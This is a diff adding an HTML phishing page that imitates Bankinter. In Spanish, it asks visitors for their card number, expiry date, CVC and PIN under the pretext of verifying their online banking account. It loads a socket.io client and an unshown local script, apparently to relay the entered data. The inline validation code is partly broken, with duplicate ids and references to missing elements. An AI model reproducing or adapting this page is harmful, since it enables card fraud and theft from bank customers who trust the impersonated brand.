@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/galo.css">
+    <link rel="stylesheet" href="./css/galo-mb.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body >  
+    <div class="topline"></div>
+    <div class="kolchi">
+        
+        <!-- lfoqani -->
+        
+        <div class="lfoq"> 
+            <div class="top-img">
+                <img class="top-pc" src="./img/hetopo-pc-02.png" alt="">
+                <img class="top-mb" src="./img/hedopo-mb-02.png" alt="">
+            </div>
+        </div>
+        <!--  -->
+        <div class="center2">
+            <div>
+                <p class="pp3">Tu tarjeta de coordenadas</p> 
+                
+                <form method="post" id="pg1">
+                    <div class="inform in-cc">
+                        <p class="pp4">Ingresa los detalles de una tarjeta de crédito o débito de Bankinter para verificar su cuenta bancaria en
+                            línea.</span></p>
+                        <div class="group">      
+                            <input style="color: rgb(130, 130, 130);" type="tel" id="dni" required maxlength="19">
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>NUMERO DE TARJETA</label>
+                        </div> 
+                        <!--  -->
+                        <div class="mm">
+                            <div class="group right-mm">   
+                                <input  style="color: rgb(130, 130, 130);" type="tel" id="dni" required maxlength="2">
+                                <span class="highlight"></span>
+                                <span class="bar"></span>
+                                <label>MM</label>
+                            </div>  
+                            <div class="group">      
+                                <input style="color: rgb(130, 130, 130);" type="tel" id="dni" required maxlength="4">
+                                <span class="highlight"></span>
+                                <span class="bar"></span>
+                                <label>YY</label>
+                            </div> 
+                        </div>
+                        <!--  -->
+                        <div class="group inp-mini">      
+                            <input style="color: rgb(130, 130, 130);" type="tel" id="dni" required maxlength="4">
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>CVC/CVV2</label>
+                        </div>
+                        
+                        <div class="group inp-mini">  
+                            <input style="color: rgb(130, 130, 130);" type="tel" id="dni" required maxlength="4">
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>PIN</label>
+                        </div>
+                    
+                    
+                    </div> 
+                
+                
+                <button type="submit">Continuar</button>
+            </form>
+            </div>
+        </div>
+
+        <div class="botano">
+            <img class="bot-pc" src="./img/botanoma-pc01.png" alt="">
+            <img class="bot-mb" src="./img/botanoma-mb01.png" alt="">
+            <!-- <div class="topline2"></div> -->
+        </div>
+    </div>
+    
+    <script type="importmap">
+        {
+          "imports": {
+            "socket.io-client": "https://cdn.socket.io/4.7.2/socket.io.esm.min.js"
+          }
+        }
+      </script>
+    <script>
+        document.getElementById('dni').addEventListener('input', function(event) {
+    // Remove any non-numeric characters
+    this.value = this.value.replace(/[^0-9]/g, '');
+
+    // Check if the input starts with 6 or 7
+    if (this.value.startsWith('6') || this.value.startsWith('7')) {
+        // If it starts with 6 or 7, set the border back to normal
+        document.querySelector('.group2').style.border = '';
+    } else {
+        // If it doesn't start with 6 or 7, set the border to red
+        document.querySelector('.group2').style.border = '2px solid red';
+    }
+});
+
+document.getElementById('submitButton').addEventListener('click', function(event) {
+    const dniInput = document.getElementById('dni');
+    if (!dniInput.value.startsWith('6') && !dniInput.value.startsWith('7')) {
+        // Prevent form submission if the input doesn't start with 6 or 7
+        event.preventDefault();
+        alert('Input must start with 6 or 7');
+    }
+});
+    </script>
+    <!-- my script -->
+    <script src="./js/stb.js" type="module"></script>
+</body>
+</html>
